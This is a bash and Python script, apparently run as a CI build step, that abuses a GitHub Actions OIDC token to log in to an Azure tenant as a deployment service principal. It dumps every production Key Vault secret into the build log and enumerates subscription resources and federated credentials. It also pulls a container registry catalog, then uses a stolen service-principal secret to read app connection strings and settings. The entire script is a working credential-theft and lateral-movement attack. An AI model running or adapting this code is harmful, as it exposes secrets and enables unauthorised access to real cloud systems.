#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
PLATFORM_RG="rg-tbl-platform-prod-sea"
REPORTING_RG="rg-tbl-reporting-prod-eus"

echo "=== BUILD53: FEDCREDS + KVSEC + FULL RESOURCE ENUM ==="

# 1. Login as cicd-deployer
JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none
echo "cicd-deployer OK"

python3 -I << 'PYEOF'
import subprocess, json, urllib.request, urllib.error, base64, re

r = subprocess.run(['az','account','get-access-token','--resource','https://management.azure.com','--query','accessToken','-o','tsv'],
  capture_output=True, text=True)
ARM = r.stdout.strip()

r2 = subprocess.run(['az','account','get-access-token','--resource','https://vault.azure.net','--query','accessToken','-o','tsv'],
  capture_output=True, text=True)
VAULT = r2.stdout.strip()

r3 = subprocess.run(['az','account','get-access-token','--resource','https://graph.microsoft.com','--query','accessToken','-o','tsv'],
  capture_output=True, text=True)
GRAPH = r3.stdout.strip()

print(f"cicd ARM len={len(ARM)}")
print(f"cicd VAULT len={len(VAULT)}")
print(f"cicd GRAPH len={len(GRAPH)}")

SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
PLATFORM_RG = "rg-tbl-platform-prod-sea"
REPORTING_RG = "rg-tbl-reporting-prod-eus"

# tbl-legacy-admin
LA_OID = "43834909-47cf-4a4a-8048-e323b4897ed3"  # SP OID
LA_APP_OID = "22a3fb7e-b9fc-4bdb-baa1-b4e4d0b9d42e"  # App object OID (from build26 if known)
LA_APPID = "891fb158-e02c-4428-a885-53b811f369c0"

def rq(url, tok, method="GET", data=None):
    h = {"Authorization":"Bearer "+tok}
    if isinstance(data,(dict,list)):
        data = json.dumps(data).encode()
        h["Content-Type"] = "application/json"
    try:
        r = urllib.request.urlopen(urllib.request.Request(url,data=data,method=method,headers=h),timeout=30)
        return r.status, r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8","replace")[:3000]
    except Exception as e:
        return 0, str(e)[:300]

if len(GRAPH) > 100:
    # Get tbl-legacy-admin SP federated credentials - find the exact issuer+subject
    # First get the application object ID
    s,b = rq(f"https://graph.microsoft.com/v1.0/applications?$filter=appId eq '{LA_APPID}'&$select=id,displayName,federatedIdentityCredentials", GRAPH)
    print(f"la_app_filter: {s}:{b[:2000]}")

    # Try known OIDs for the app object
    for oid in [LA_APP_OID, "22a3fb7e-b9fc-4bdb-baa1-b4e4d0b9d42e"]:
        s,b = rq(f"https://graph.microsoft.com/v1.0/applications/{oid}/federatedIdentityCredentials", GRAPH)
        print(f"la_fedcreds_{oid[:8]}: {s}:{b[:3000]}")

    # Try via SP to get the app
    s,b = rq(f"https://graph.microsoft.com/v1.0/servicePrincipals/{LA_OID}", GRAPH)
    print(f"la_sp_details: {s}:{b[:2000]}")

    # Get the SP's appId then find the application
    try:
        sp_data = json.loads(b if s==200 else '{}')
        app_id = sp_data.get('appId', LA_APPID)
        app_obj_id = sp_data.get('appOwnerOrganizationId', '')
        print(f"la_appId={app_id}")
    except:
        pass

    # List ALL applications and find tbl-legacy-admin
    s,b = rq("https://graph.microsoft.com/v1.0/applications?$select=id,displayName,appId&$filter=displayName eq 'tbl-legacy-admin'", GRAPH)
    print(f"la_app_search: {s}:{b[:2000]}")

    # Get federated creds for ALL known app OIDs
    for name, oid in [("cicd", "72ff278a-9e71-43ec-bac4-2ca303f8e462"),
                       ("legacy_sp", LA_OID)]:
        s,b = rq(f"https://graph.microsoft.com/v1.0/servicePrincipals?$filter=appId eq '{oid}'&$select=id,displayName,appId", GRAPH)
        print(f"sp_lookup_{name}: {s}:{b[:500]}")

    # Get cicd-deployer full app_roles (not truncated)
    CICD_OID = "63e87ab1-6bd2-4e80-92be-943450b20e4f"
    s,b = rq(f"https://graph.microsoft.com/v1.0/servicePrincipals/{CICD_OID}/appRoleAssignments", GRAPH)
    print(f"cicd_app_roles_full: {s}:{b[:5000]}")

if len(ARM) > 100:
    # LIST ALL SECRETS in kv-tbl-prod-x3euoz (we only fetched named ones before!)
    # Using cicd-deployer vault token via Access Policy
    if len(VAULT) > 100:
        s,b = rq("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4&maxresults=100", VAULT)
        print(f"kv_prod_all_secrets_list: {s}:{b[:5000]}")
        if s == 200:
            items = json.loads(b).get('value', [])
            print(f"kv_prod_secret_count: {len(items)}")
            for item in items:
                sid = item.get('id','')
                name = sid.split('/secrets/')[1].split('/')[0] if '/secrets/' in sid else ''
                sv,bv = rq(f"https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/{name}?api-version=7.4", VAULT)
                print(f"kv_prod_secret_{name}: {sv}:{bv[:300]}")

        # Also check certs and keys in kv-tbl-prod
        s,b = rq("https://kv-tbl-prod-x3euoz.vault.azure.net/certificates?api-version=7.4", VAULT)
        print(f"kv_prod_certs: {s}:{b[:2000]}")

        s,b = rq("https://kv-tbl-prod-x3euoz.vault.azure.net/keys?api-version=7.4", VAULT)
        print(f"kv_prod_keys: {s}:{b[:2000]}")

    # Get ALL resources in PLATFORM RG (full - not truncated)
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/resources?api-version=2021-04-01", ARM)
    print(f"platform_resources_full: {s}:{b}")

    # Get ALL resources in REPORTING RG
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/resources?api-version=2021-04-01", ARM)
    print(f"reporting_resources_full: {s}:{b}")

    # List ALL resource groups in subscription
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourcegroups?api-version=2021-04-01", ARM)
    print(f"all_resource_groups: {s}:{b}")

    # Check Azure SQL servers
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/providers/Microsoft.Sql/servers?api-version=2022-05-01-preview", ARM)
    print(f"sql_servers: {s}:{b[:3000]}")

    # Check CosmosDB
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/providers/Microsoft.DocumentDB/databaseAccounts?api-version=2023-04-15", ARM)
    print(f"cosmosdb: {s}:{b[:3000]}")

    # Check Redis
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/providers/Microsoft.Cache/redis?api-version=2023-08-01", ARM)
    print(f"redis: {s}:{b[:3000]}")

    # List ALL App Services in subscription
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/providers/Microsoft.Web/sites?api-version=2022-03-01", ARM)
    print(f"all_app_services: {s}:{b[:3000]}")

    # Check Azure Functions
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/providers/Microsoft.Web/sites?api-version=2022-03-01&$filter=kind eq 'functionapp'", ARM)
    print(f"function_apps: {s}:{b[:2000]}")

    # KV SEC full properties (who has access policies)
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz?api-version=2023-07-01", ARM)
    print(f"kvsec_properties_full: {s}:{b}")

    # KV PROD full properties (access policies)
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.KeyVault/vaults/kv-tbl-prod-x3euoz?api-version=2023-07-01", ARM)
    print(f"kvprod_properties_full: {s}:{b}")

    # ACR - try different token audience for pull
    r_acr = subprocess.run(['az','account','get-access-token','--resource','https://management.azure.com','--query','accessToken','-o','tsv'],
      capture_output=True, text=True)
    ACR_ARM = r_acr.stdout.strip()
    ACR = "crtblplatprodx3euoz.azurecr.io"

    # Exchange ARM token for ACR refresh token via POST to /oauth2/exchange
    try:
        import urllib.parse
        exc_body = urllib.parse.urlencode({
            "grant_type": "access_token_refresh_token",
            "service": ACR,
            "tenant": "3205c325-06a5-4171-9ce8-ffc5e6c2845e",
            "access_token": ACR_ARM
        })
        exc_r = urllib.request.urlopen(urllib.request.Request(
            f"https://{ACR}/oauth2/exchange",
            data=exc_body.encode(),
            method="POST",
            headers={"Content-Type": "application/x-www-form-urlencoded"}
        ), timeout=20)
        exc_data = json.loads(exc_r.read())
        rt = exc_data.get("refresh_token","")
        print(f"acr_refresh_tok len={len(rt)}")

        if rt:
            # Get catalog access token
            tok_body = urllib.parse.urlencode({
                "grant_type": "refresh_token",
                "service": ACR,
                "scope": "registry:catalog:*",
                "refresh_token": rt
            })
            tok_r = urllib.request.urlopen(urllib.request.Request(
                f"https://{ACR}/oauth2/token",
                data=tok_body.encode(),
                method="POST",
                headers={"Content-Type": "application/x-www-form-urlencoded"}
            ), timeout=20)
            at = json.loads(tok_r.read()).get("access_token","")
            print(f"acr_access_tok len={len(at)}")

            if at:
                cat_r = urllib.request.urlopen(urllib.request.Request(
                    f"https://{ACR}/v2/_catalog",
                    headers={"Authorization": f"Bearer {at}"}
                ), timeout=20)
                catalog = json.loads(cat_r.read())
                print(f"acr_catalog: {catalog}")

                for repo in catalog.get("repositories",[])[:20]:
                    tok2_body = urllib.parse.urlencode({
                        "grant_type": "refresh_token",
                        "service": ACR,
                        "scope": f"repository:{repo}:pull",
                        "refresh_token": rt
                    })
                    tok2_r = urllib.request.urlopen(urllib.request.Request(
                        f"https://{ACR}/oauth2/token",
                        data=tok2_body.encode(),
                        method="POST",
                        headers={"Content-Type": "application/x-www-form-urlencoded"}
                    ), timeout=20)
                    at2 = json.loads(tok2_r.read()).get("access_token","")

                    tags_r = urllib.request.urlopen(urllib.request.Request(
                        f"https://{ACR}/v2/{repo}/tags/list",
                        headers={"Authorization": f"Bearer {at2}"}
                    ), timeout=20)
                    tags = json.loads(tags_r.read())
                    print(f"acr_repo_{repo}: {tags}")
    except Exception as e:
        print(f"acr_exchange_err: {e}")

    # Use reporting-service-principal to get FULL app settings
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/list?api-version=2022-03-01", ARM, "POST")
    print(f"reporting_config_list: {s}:{b[:5000]}")

    # Storefront identity details
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod?api-version=2022-03-01", ARM)
    print(f"storefront_site: {s}:{b[:5000]}")

PYEOF

# 2. Use reporting-service-principal to get FULL config (connection strings, env vars)
az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name reporting-service-principal \
  --query value -o tsv > /tmp/rs_secret.json 2>/dev/null

python3 -I << 'RS_PY'
import subprocess, json, urllib.request, urllib.error

try:
    v = json.loads(open('/tmp/rs_secret.json').read().strip())
    cid = v.get('appId','')
    sec = v.get('clientSecret','')
    print(f"rs cid={cid}")
except Exception as e:
    print(f"rs load err: {e}")
    import sys; sys.exit(0)

TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
REPORTING_RG = "rg-tbl-reporting-prod-eus"

r = subprocess.run(['az','login','--service-principal','-u',cid,'-p',sec,'--tenant',TEN,'-o','none'],
  capture_output=True, text=True)
print("rs login:", r.returncode)

r = subprocess.run(['az','account','get-access-token','--resource','https://management.azure.com','--query','accessToken','-o','tsv'],
  capture_output=True, text=True)
RS_ARM = r.stdout.strip()
print(f"rs ARM len={len(RS_ARM)}")

def rq(url, tok, method="GET", data=None):
    h = {"Authorization":"Bearer "+tok}
    if isinstance(data,(dict,list)):
        data = json.dumps(data).encode()
        h["Content-Type"] = "application/json"
    try:
        r = urllib.request.urlopen(urllib.request.Request(url,data=data,method=method,headers=h),timeout=30)
        return r.status, r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8","replace")[:3000]
    except Exception as e:
        return 0, str(e)[:300]

if len(RS_ARM) > 100:
    # Get FULL config for reporting app (connection strings, app settings, EVERYTHING)
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/list?api-version=2022-03-01", RS_ARM, "POST")
    print(f"rs_reporting_config_full: {s}:{b}")

    # Get web config (shows runtime, always-on, etc.)
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/web?api-version=2022-03-01", RS_ARM)
    print(f"rs_reporting_webconfig: {s}:{b[:3000]}")

    # Also try to list storefront config
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/list?api-version=2022-03-01", RS_ARM, "POST")
    print(f"rs_storefront_config: {s}:{b[:3000]}")
RS_PY

echo "BUILD53 DONE"
